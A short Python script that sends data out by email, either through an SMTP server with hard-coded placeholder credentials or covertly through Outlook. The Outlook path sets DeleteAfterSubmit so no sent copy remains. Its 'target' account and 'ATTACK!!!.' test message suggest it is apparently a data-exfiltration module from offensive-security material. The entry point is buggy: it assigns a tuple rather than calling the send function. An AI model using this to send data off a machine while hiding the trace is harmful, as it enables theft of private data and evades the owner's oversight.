import smtplib
import time
import win32com.client

smtp_server='abcd.ex.com'
smtp_port=587 
smpt_acct='ex@ex.com'
smtp_passwd='Abcd'

#target email adress:
tgt_acct=['ex@ex.com']

def plain_email(subject,contents):
    message=f'Subject:{subject}\nFrom{smpt_acct}\n'
    message+=f'To {tgt_acct}\n\n{contents.decode()}'
    server=smtplib.SMTP(smtp_server,smtp_port)
    server.starttls()
    server.login(smpt_acct,smtp_passwd)

    #server.set_debuglevel(1)

    server.sendmail(smpt_acct,tgt_acct,message)
    time.sleep(1)
    server.quit()
def outlook(subject,contents):
    outlook=win32com.client.Dispatch('Outlook.Application')
    message=outlook.CreateItem(0)
    message.DeleteAfterSubmit=True
    message.Subject=subject
    message.Body=contents.decode()
    message.To=tgt_acct[0]
    message.send()

if __name__=='__main__':
    plain_email=('test message', 'ATTACK!!!.')